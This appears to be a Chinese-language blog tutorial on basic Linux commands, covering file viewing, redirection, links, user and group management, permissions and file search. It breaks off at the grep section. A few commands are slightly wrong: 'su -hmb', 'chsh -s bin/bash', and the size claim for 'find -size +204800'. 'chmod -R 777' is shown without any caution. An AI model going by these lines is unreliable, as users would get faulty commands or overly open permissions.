href="#touch（修改文件或者目录的时间属性。若文件不存在，系统会建立一个新的文件。）" class="headerlink" title="touch（修改文件或者目录的时间属性。若文件不存在，系统会建立一个新的文件。）"></a>touch（修改文件或者目录的时间属性。若文件不存在，系统会建立一个新的文件。）</h3><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">touch <span class="hljs-selector-attr">[-acfm]</span><span class="hljs-selector-attr">[-d&lt;日期时间&gt;]</span><span class="hljs-selector-attr">[-r&lt;参考文件或目录&gt;]</span> <span class="hljs-selector-attr">[-t&lt;日期时间&gt;]</span><span class="hljs-selector-attr">[--help]</span><span class="hljs-selector-attr">[--version]</span><span class="hljs-selector-attr">[文件或目录…]</span><br></code></pre></td></tr></table></figure><ul><li><strong>参数说明</strong>：</li><li>a 改变档案的读取时间记录。</li><li>m 改变档案的修改时间记录。</li><li>c 假如目的档案不存在，不会建立新的档案。与 –no-create 的效果一样。</li><li>f 不使用，是为了与其他 unix 系统的相容性而保留。</li><li>r 使用参考档的时间记录，与 –file 的效果一样。</li><li>d 设定时间与日期，可以使用各种不同的格式。</li><li>t 设定档案的时间记录，格式与 date 指令相同。</li><li>–no-create 不会建立新档案。</li><li>–help 列出指令格式。</li><li>–version 列出版本讯息。</li></ul><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>使用指令”touch”修改文件”testfile”的时间属性为当前系统时间，输入如下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">touch</span> testfile                <span class="hljs-comment">#修改文件的时间属性</span></span> <br></code></pre></td></tr></table></figure><p>首先，使用ls命令查看testfile文件的属性，如下所示：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">$ <span class="hljs-keyword">ls</span> -l testfile                <span class="hljs-comment">#查看文件的时间属性  </span><br><span class="hljs-comment">#原来文件的修改时间为16:09  </span><br>-rw-r<span class="hljs-params">--r--</span> 1 hdd hdd 55 2011-08-22 16<span class="hljs-function">:09</span> testfile  <br></code></pre></td></tr></table></figure><p>执行指令”touch”修改文件属性以后，并再次查看该文件的时间属性，如下所示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">touch</span> testfile                <span class="hljs-comment">#修改文件时间属性为当前系统时间</span></span>  <br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">ls</span> -l testfile                <span class="hljs-comment">#查看文件的时间属性</span></span>  <br><span class="hljs-meta prompt_">#</span><span class="language-bash">修改后文件的时间属性为当前系统时间</span>  <br>-rw-r--r-- 1 hdd hdd 55 2011-08-22 19:53 testfile  <br></code></pre></td></tr></table></figure><p>使用指令”touch”时，如果指定的文件不存在，则将创建一个新的空白文件。例如，在当前目录下，使用该指令创建一个空白文件”file”，输入如下命令：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> touch <span class="hljs-keyword">file</span>            #创建一个名为“<span class="hljs-keyword">file</span>”的新的空白文件 <br></code></pre></td></tr></table></figure><hr><h2 id="Linux-文件内容查看"><a href="#Linux-文件内容查看" class="headerlink" title="Linux 文件内容查看"></a>Linux 文件内容查看</h2><p>Linux系统中使用以下命令来查看文件的内容：</p><ul><li>cat 由第一行开始显示文件内容</li><li>tac 从最后一行开始显示，可以看出 tac 是 cat 的倒着写！</li><li>nl  显示的时候，顺道输出行号！</li><li>more 一页一页的显示文件内容</li><li>less 与 more 类似，但是比 more 更好的是，他可以往前翻页！</li><li>head 只看头几行</li><li>tail 只看尾巴几行</li></ul><p>你可以使用 *man [命令]*来查看各个命令的使用文档，如 ：man cp。</p><h3 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h3><p>由第一行开始显示文件内容</p><p>语法：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cat</span><span class="hljs-meta"> [-AbEnTv]</span><br></code></pre></td></tr></table></figure><p>选项与参数：</p><ul><li>-A ：相当於 -vET 的整合选项，可列出一些特殊字符而不是空白而已；</li><li>-b ：列出行号，仅针对非空白行做行号显示，空白行不标行号！</li><li>-E ：将结尾的断行字节 $ 显示出来；</li><li>-n ：列印出行号，连同空白行也会有行号，与 -b 的选项不同；</li><li>-T ：将 [tab] 按键以 ^I 显示出来；</li><li>-v ：列出一些看不出来的特殊字符</li></ul><p>检看 &#x2F;etc&#x2F;issue 这个文件的内容：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cat</span> /etc/issue<br><br><span class="hljs-attribute">CentOS</span> release <span class="hljs-number">6</span>.<span class="hljs-number">4</span> (Final)<br><span class="hljs-attribute">Kernel</span> \r <span class="hljs-literal">on</span> an \m<br></code></pre></td></tr></table></figure><h3 id="tac"><a href="#tac" class="headerlink" title="tac"></a>tac</h3><p>tac与cat命令刚好相反，文件内容从最后一行开始显示，可以看出 tac 是 cat 的倒着写！如：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tac</span> /etc/issue<br><br><span class="hljs-attribute">Kernel</span> \r <span class="hljs-literal">on</span> an \m<br><span class="hljs-attribute">CentOS</span> release <span class="hljs-number">6</span>.<span class="hljs-number">4</span> (Final)<br></code></pre></td></tr></table></figure><h3 id="nl"><a href="#nl" class="headerlink" title="nl"></a>nl</h3><p>显示行号</p><p>语法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">nl</span> [-bnw] 文件<br></code></pre></td></tr></table></figure><p>选项与参数：</p><ul><li>-b ：指定行号指定的方式，主要有两种：<br>-b a ：表示不论是否为空行，也同样列出行号(类似 cat -n)；<br>-b t ：如果有空行，空的那一行不要列出行号(默认值)；</li><li>-n ：列出行号表示的方法，主要有三种：<br>-n ln ：行号在荧幕的最左方显示；<br>-n rn ：行号在自己栏位的最右方显示，且不加 0 ；<br>-n rz ：行号在自己栏位的最右方显示，且加 0 ；</li><li>-w ：行号栏位的占用的位数。</li></ul><p>实例一：用 nl 列出 &#x2F;etc&#x2F;issue 的内容</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nl</span> /etc/issue<br>     <span class="hljs-attribute">1</span>  CentOS release <span class="hljs-number">6</span>.<span class="hljs-number">4</span> (Final)<br>     <span class="hljs-attribute">2</span>  Kernel \r <span class="hljs-literal">on</span> an \m<br></code></pre></td></tr></table></figure><h3 id="more"><a href="#more" class="headerlink" title="more"></a>more</h3><p>一页一页翻动</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">more <span class="hljs-string">/etc/man_db.config</span> <br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Generated automatically from man.conf.in by the</span><br><span class="hljs-comment"># configure script.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># man.conf from man-1.6d</span><br><span class="hljs-string">....</span><span class="hljs-params">(中间省略)</span><span class="hljs-string">....</span><br><span class="hljs-params">--More--</span><span class="hljs-params">(28%)</span>  &lt;== 重点在这一行喔！你的光标也会在这里等待你的命令<br></code></pre></td></tr></table></figure><p>在 more 这个程序的运行过程中，你有几个按键可以按的：</p><ul><li>空白键 (space)：代表向下翻一页；</li><li>Enter     ：代表向下翻『一行』；</li><li>&#x2F;字串     ：代表在这个显示的内容当中，向下搜寻『字串』这个关键字；</li><li>:f      ：立刻显示出档名以及目前显示的行数；</li><li>q       ：代表立刻离开 more ，不再显示该文件内容。</li><li>b 或 [ctrl]-b ：代表往回翻页，不过这动作只对文件有用，对管线无用。</li></ul><h3 id="less"><a href="#less" class="headerlink" title="less"></a>less</h3><p>一页一页翻动，以下实例输出&#x2F;etc&#x2F;man.config文件的内容：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">less <span class="hljs-string">/etc/man.config</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Generated automatically from man.conf.in by the</span><br><span class="hljs-comment"># configure script.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># man.conf from man-1.6d</span><br><span class="hljs-string">....</span><span class="hljs-params">(中间省略)</span><span class="hljs-string">....</span><br>:   &lt;== 这里可以等待你输入命令！<br></code></pre></td></tr></table></figure><p>less运行时可以输入的命令有：</p><ul><li>空白键  ：向下翻动一页；</li><li>[pagedown]：向下翻动一页；</li><li>[pageup] ：向上翻动一页；</li><li>&#x2F;字串   ：向下搜寻『字串』的功能；</li><li>?字串   ：向上搜寻『字串』的功能；</li><li>n     ：重复前一个搜寻 (与 &#x2F; 或 ? 有关！)</li><li>N     ：反向的重复前一个搜寻 (与 &#x2F; 或 ? 有关！)</li><li>q     ：离开 less 这个程序；</li></ul><h3 id="head"><a href="#head" class="headerlink" title="head"></a>head</h3><p>取出文件前面几行</p><p>语法：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">head [-n <span class="hljs-built_in">number</span>] 文件 <br></code></pre></td></tr></table></figure><p>选项与参数：</p><ul><li>-n ：后面接数字，代表显示几行的意思</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">head</span> /etc/man.config<br></code></pre></td></tr></table></figure><p>默认的情况中，显示前面 10 行！若要显示前 20 行，就得要这样：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">head</span> -n 20 /etc/man.config<br></code></pre></td></tr></table></figure><h3 id="tail"><a href="#tail" class="headerlink" title="tail"></a>tail</h3><p>取出文件后面几行</p><p>语法：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">tail [-n <span class="hljs-built_in">number</span>] 文件 <br></code></pre></td></tr></table></figure><p>选项与参数：</p><ul><li>-n ：后面接数字，代表显示几行的意思</li><li>-f ：表示持续侦测后面所接的档名，要等到按下[ctrl]-c才会结束tail的侦测</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">tail</span> /etc/man.config<br><span class="hljs-comment"># 默认的情况中，显示最后的十行！若要显示最后的 20 行，就得要这样：</span><br><span class="hljs-built_in">tail</span> -n 20 /etc/man.config<br></code></pre></td></tr></table></figure><p>一般查看比较小的文件，一屏幕能显示全的。按 ctrl + s 暂停，按ctrl + q 继续</p><h3 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h3><p>echo [选项] [输出内容]</p><p>可以用在写脚本的时候输出日志</p><p>-e： 支持反斜线控制的字符转换</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1699545747546-0f717f66-accb-4d3b-bcf4-78eb1b231fdf.png" alt="87dde62deddd49789ba538b6c427eb27.png"></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">echo</span> “hello\tworld”  <span class="hljs-string">//</span>输出hello world<br><span class="hljs-keyword">echo</span> -e “hello\tworld” <span class="hljs-comment"># -e支持反斜线控制的字符转换</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1699545768003-9e95fd74-be97-4aea-aa89-4e14561d647a.png" alt="507481453de74dfea1331d23d0b0240c.png"></p><h3 id="输出重定向-和-追加"><a href="#输出重定向-和-追加" class="headerlink" title="&gt; 输出重定向 和 &gt;&gt; 追加"></a>&gt; 输出重定向 和 &gt;&gt; 追加</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">ls</span> -l&gt;houge.txt  <span class="hljs-string">//</span>将 <span class="hljs-keyword">ls</span> 查看信息写入到文件中<br><span class="hljs-keyword">ls</span> -l&gt;&gt;houge.txt  <span class="hljs-string">//</span>将 <span class="hljs-keyword">ls</span> 查看信息追加到文件中  <br><span class="hljs-keyword">echo</span> hello&gt;&gt;houge.txt  <span class="hljs-string">//</span>采用 <span class="hljs-keyword">echo</span> 将 hello 单词追加到文件中<br><br></code></pre></td></tr></table></figure><h3 id="ln-软链接"><a href="#ln-软链接" class="headerlink" title="ln 软链接"></a>ln 软链接</h3><p>软链接也称为符号链接，类似于 windows 里的快捷方式，有自己的数据块，主要存放了链接其他文件的路径。</p><p>ln -s [原文件或目录] [软链接名] （功能描述：给原文件创建一个软链接）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /home/lnTest.txt ./lnTxt  //创建软连接<br><span class="hljs-built_in">rm</span> -rf 软连接名  //删除软连接，不能写成软连接名/<br>如果使用 <span class="hljs-built_in">rm</span> -rf 软链接名/ 删除，会把软链接对应的真实目录下内容删掉 <br></code></pre></td></tr></table></figure><p>查询：通过 ll 就可以查看，列表属性第 1 位是 l，尾部会有位置指向。  </p><h3 id="history"><a href="#history" class="headerlink" title="history"></a>history</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">history</span>  <span class="hljs-string">//</span>查看已经执行过的历史命令<br><span class="hljs-keyword">history</span> -c  <span class="hljs-string">//</span>清空历史记录 <br></code></pre></td></tr></table></figure><h3 id="时间日期类"><a href="#时间日期类" class="headerlink" title="时间日期类"></a>时间日期类</h3><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">date</span>  <span class="hljs-comment">//显示当前时间信息</span><br><span class="hljs-built_in">date</span> -s <span class="hljs-string">&quot;2023-06-19 20:52:18&quot;</span>  <span class="hljs-comment">//设置系统当前时间  </span><br><br></code></pre></td></tr></table></figure><hr><h2 id="用户管理命令"><a href="#用户管理命令" class="headerlink" title="用户管理命令"></a>用户管理命令</h2><h4 id="useradd"><a href="#useradd" class="headerlink" title="useradd"></a>useradd</h4><p>useradd 用户名 （功能描述：添加新用户）</p><p>useradd -g 组名 用户名 （功能描述：添加新用户到某个组）</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">useradd hmb  <span class="hljs-comment">//添加hmb用户</span><br><br></code></pre></td></tr></table></figure><h4 id="passwd"><a href="#passwd" class="headerlink" title="passwd"></a>passwd</h4><p>passwd 用户名 （功能描述：设置用户密码）</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">passwd hmb  <span class="hljs-comment">//设置用户的密码</span><br><br></code></pre></td></tr></table></figure><h4 id="id"><a href="#id" class="headerlink" title="id"></a>id</h4><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs fsharp"><span class="hljs-built_in">id</span> hmb  <span class="hljs-comment">//查看用户是否存在</span><br><br>useradd <span class="hljs-operator">-</span>m 用户名<br>passwd 用户名<br>usermod <span class="hljs-operator">-</span>a <span class="hljs-operator">-</span>G sudo testuser<br>chsh <span class="hljs-operator">-</span>s bin<span class="hljs-operator">/</span>bash testuser  <span class="hljs-comment">//新建具有登录权限的用户</span><br></code></pre></td></tr></table></figure><h4 id="cat-etc-passwd-查看创建了哪些用户"><a href="#cat-etc-passwd-查看创建了哪些用户" class="headerlink" title="cat &#x2F;etc&#x2F;passwd 查看创建了哪些用户"></a>cat &#x2F;etc&#x2F;passwd 查看创建了哪些用户</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/etc/</span>passwd  <span class="hljs-regexp">//</span>查看创建了哪些用户<br></code></pre></td></tr></table></figure><h4 id="su"><a href="#su" class="headerlink" title="su"></a>su</h4><p>su 用户名称 （功能描述：切换用户，只能获得用户的执行权限，不能获得环境变量）</p><p>su - 用户名称 （功能描述：切换到用户并获得该用户的环境变量及执行权限）</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">su</span> hmb  <span class="hljs-comment">//切换为hmb用户</span><br><span class="hljs-keyword">su</span> -hmb  <span class="hljs-comment">//切换为hmb用户,并获得hmb用户的环境变量及执行权限</span><br></code></pre></td></tr></table></figure><h4 id="userdel"><a href="#userdel" class="headerlink" title="userdel"></a>userdel</h4><p>userdel 用户名 （功能描述：删除用户但保存用户主目录）</p><p>userdel -r 用户名 （功能描述：用户和用户主目录，都删除）</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">userdel hmb</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">userdel -r hmb</span><br><br></code></pre></td></tr></table></figure><h4 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h4><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">sudo su <span class="hljs-comment"> //切换root用户</span><br>usermod -<span class="hljs-keyword">a</span> -G sudo 用户名<br></code></pre></td></tr></table></figure><h4 id="usermod修改用户"><a href="#usermod修改用户" class="headerlink" title="usermod修改用户"></a>usermod修改用户</h4><p>usermod -g 用户组 用户名</p><p>-a:仅和-G一块使用，将用户添加到附属组群。<br>-d:修改用户登入时的目录，例如一般的用户登录时，默认进入预先设定的主目录，某些时候为了方便登录时就需要进入比较复杂的路径时，可以使用这个选项设置进入时目录。<br>-g:修改用户所属群组。<br>-G:修改用户所属的附加群组；在改变用户sudo权限时就可以使用这个选项。<br>-s:修改用户登录后所使用的shell版本</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">usermod -g root zhubajie  <span class="hljs-comment">//将用户加入到用户组 </span><br></code></pre></td></tr></table></figure><h4 id="groupadd新增组"><a href="#groupadd新增组" class="headerlink" title="groupadd新增组"></a>groupadd新增组</h4><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">groupadd xitianqujing  <span class="hljs-comment">//添加一个xitianqujing组</span><br></code></pre></td></tr></table></figure><h4 id="groupdel删除组"><a href="#groupdel删除组" class="headerlink" title="groupdel删除组"></a>groupdel删除组</h4><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">groupdel xitianqujing  <span class="hljs-comment">//删除xitianqujing组</span><br></code></pre></td></tr></table></figure><h4 id="groupmod-修改组"><a href="#groupmod-修改组" class="headerlink" title="groupmod 修改组"></a>groupmod 修改组</h4><p>groupmod -n 新组名 老组名</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">groupmod -n xitian xitianqujing  <span class="hljs-comment">//将xitianqujing组改成xitian组</span><br></code></pre></td></tr></table></figure><h4 id="cat-etc-group-查看创建了哪些组"><a href="#cat-etc-group-查看创建了哪些组" class="headerlink" title="cat &#x2F;etc&#x2F;group 查看创建了哪些组"></a>cat &#x2F;etc&#x2F;group 查看创建了哪些组</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/group<br></code></pre></td></tr></table></figure><hr><h3 id="文件权限类"><a href="#文件权限类" class="headerlink" title="文件权限类"></a>文件权限类</h3><h4 id="文件属性"><a href="#文件属性" class="headerlink" title="文件属性"></a>文件属性</h4><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1699546253488-a7c2cb39-5083-4700-9aae-a3a62e94995d.png" alt="img"></p><p>使用ll或 ls -lh命令查看权限</p><p>如果没有权限，就会出现减号[ - ]而已。从左至右用0-9这些数字来表示:</p><p>​    0 首位表示类型</p><p>​        在Linux中第一个字符代表这个文件是目录、文件或链接文件等等</p><p>​        代表文件</p><p>​        d 代表目录</p><p>​        l 链接文档(link file)；</p><p>​    第1-3位确定属主（该文件的所有者）拥有该文件的权限。—User</p><p>​    第4-6位确定属组（所有者的同组用户）拥有该文件的权限，—Group</p><p>​    第7-9位确定其他用户拥有该文件的权限 —Other</p><p>（1）、rwx 作用文件和目录的不同解释</p><p>​    （1）作用到文件：</p><p>​    [ r ]代表可读(read): 可以读取，查看</p><p>​    [ w ]代表可写(write): 可以修改，但是不代表可以删除该文件，删除一个文件的前</p><p>​    [ x ]代表可执行(execute):可以被系统执行</p><p>​    （2）作用到目录：</p><p>​    [ r ]代表可读(read): 可以读取，ls查看目录内容</p><p>​    [ w ]代表可写(write): 可以修改，目录内创建+删除+重命名目录</p><p>​    [ x ]代表可执行(execute):可以进入该目录</p><p>ll命令查看解释  </p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1699546284508-c5191bd7-3f55-498c-950b-b1fc44c8d519.png" alt="img"></p><p>ls -lh 命令，文件大小会更清晰  </p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1699546293928-beb8d2c0-c84d-41ee-a1cb-dc4f1764cf96.png" alt="img"></p><p>（1）如果查看到是文件：链接数指的是硬链接个数。<br>（2）如果查看的是文件夹：链接数指的是子文件夹个数。</p><h4 id="chmod-改变权限"><a href="#chmod-改变权限" class="headerlink" title="chmod 改变权限"></a>chmod 改变权限</h4><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1699546303978-836b85e3-aa18-4b86-84d3-7e3eb5ca29b7.png" alt="img"></p><h4 id="1、第一种方式变更权限"><a href="#1、第一种方式变更权限" class="headerlink" title="1、第一种方式变更权限"></a>1、第一种方式变更权限</h4><p>chmod [{ugoa}{+ - &#x3D;}{rwx}] 文件或目录</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">u:所有者（user）        g:所有组(group)           o:其他人(other)        <span class="hljs-selector-tag">a</span>:所有人(u、g、o 的总和)<br><br>+号代表增加      -号代表取消     = 号代表直接赋予<br>chmod u+x houge<span class="hljs-selector-class">.txt</span>  <span class="hljs-comment">//修改文件使其所属主用户具有执行权限  </span><br>chmod g+x houge<span class="hljs-selector-class">.txt</span>  <span class="hljs-comment">//修改文件使其所属组用户具有执行权限  </span><br>chmod u-x,o+x houge<span class="hljs-selector-class">.txt</span>  <span class="hljs-comment">//修改文件所属主用户执行权限,并使其他用户具有执行权限  </span><br><br></code></pre></td></tr></table></figure><h4 id="2、第二种方式变更权限"><a href="#2、第二种方式变更权限" class="headerlink" title="2、第二种方式变更权限"></a>2、第二种方式变更权限</h4><p>chmod [mode&#x3D;421 ] [文件或目录]</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">r</span>=<span class="hljs-number">4</span>         w=<span class="hljs-number">2</span>        x=<span class="hljs-number">1</span>       rwx=<span class="hljs-number">4</span>+<span class="hljs-number">2</span>+<span class="hljs-number">1</span>=<span class="hljs-number">7</span><br><span class="hljs-attribute">chmod</span> <span class="hljs-number">777</span> houge.txt  //采用数字的方式，设置文件所有者、所属组、其他用户都具有可读可写可执行权限。 <br><span class="hljs-attribute">chmod</span> -R <span class="hljs-number">777</span> xiyou/  //修改整个文件夹里面的所有文件的所有者、所属组、其他用户都具有可读可写可执行权限。<br><br></code></pre></td></tr></table></figure><h4 id="3、chown-改变所有者"><a href="#3、chown-改变所有者" class="headerlink" title="3、chown 改变所有者"></a>3、chown 改变所有者</h4><p>chown [选项] [最终用户] [文件或目录] （功能描述：改变文件或者目录的所有者）</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">chown</span> hmb houge.txt  //修改文件所有者<br><span class="hljs-keyword">chown</span> -R hmb:hmb xiyou/  <span class="hljs-regexp">//</span>递归改变文件所有者和所有组  <br><br></code></pre></td></tr></table></figure><h4 id="4、chgrp-改变所属组"><a href="#4、chgrp-改变所属组" class="headerlink" title="4、chgrp 改变所属组"></a>4、chgrp 改变所属组</h4><p>chgrp [最终用户组] [文件或目录] （功能描述：改变文件或者目录的所属组）</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">chgrp root houge<span class="hljs-selector-class">.txt</span>  <span class="hljs-comment">//修改文件的所属组</span><br></code></pre></td></tr></table></figure><h3 id="搜索查找类"><a href="#搜索查找类" class="headerlink" title="搜索查找类"></a>搜索查找类</h3><h4 id="find-查找文件或者目录"><a href="#find-查找文件或者目录" class="headerlink" title="find 查找文件或者目录"></a>find 查找文件或者目录</h4><p>find 指令将从指定目录向下递归地遍历其各个子目录，将满足条件的文件显示在终端。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1699546505251-673cfbaa-a556-4634-9ac9-8ba45e0214cd.png" alt="965f4c0709cb4c18a0dc62fe119e32d6.png"></p> <figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-built_in">find</span> -<span class="hljs-built_in">name</span> <span class="hljs-string">&quot;ln*.txt&quot;</span>  <br><br><span class="hljs-built_in">find</span> xiyou/ -<span class="hljs-built_in">name</span> <span class="hljs-string">&quot;*.txt&quot;</span>  <span class="hljs-comment">//按文件名：根据名称查找/目录下的filename.txt文件。</span><br><br><span class="hljs-built_in">find</span> opt/ -user hmb  <span class="hljs-comment">//按拥有者：查找/opt目录下，用户名称为-user的文件 </span><br><br><span class="hljs-built_in">find</span> /home -<span class="hljs-built_in">size</span> +<span class="hljs-number">204800</span>  <span class="hljs-comment">//按文件大小：在/home目录下查找大于200m的文件（+n 大于 -n小于 n等x于）  </span><br><br></code></pre></td></tr></table></figure><h4 id="locate-快速定位文件路径"><a href="#locate-快速定位文件路径" class="headerlink" title="locate 快速定位文件路径"></a>locate 快速定位文件路径</h4><p>locate 指令利用事先建立的系统中所有文件名称及路径的 locate 数据库实现快速定位给定的文件。Locate 指令无需遍历整个文件系统，查询速度较快。为了保证查询结果的准确度，管理员必须定期更新 locate 时刻。</p><p>由于 <code>locate</code> 指令基于数据库进行查询，所以第一次运行前，必须使用 <code>updatedb </code>指令创建 <code>locate </code>数据库。</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gauss">updatedb<br><br><span class="hljs-keyword">locate</span> tmp  <span class="hljs-comment">//查询文件夹 </span><br></code></pre></td></tr></table></figure><h4 id="grep-过滤查找及-管道符"><a href="#grep-过滤查找及-管道符" class="headerlink" title="grep 过滤查找及 | 管道符"></a>grep 过滤查找及 | 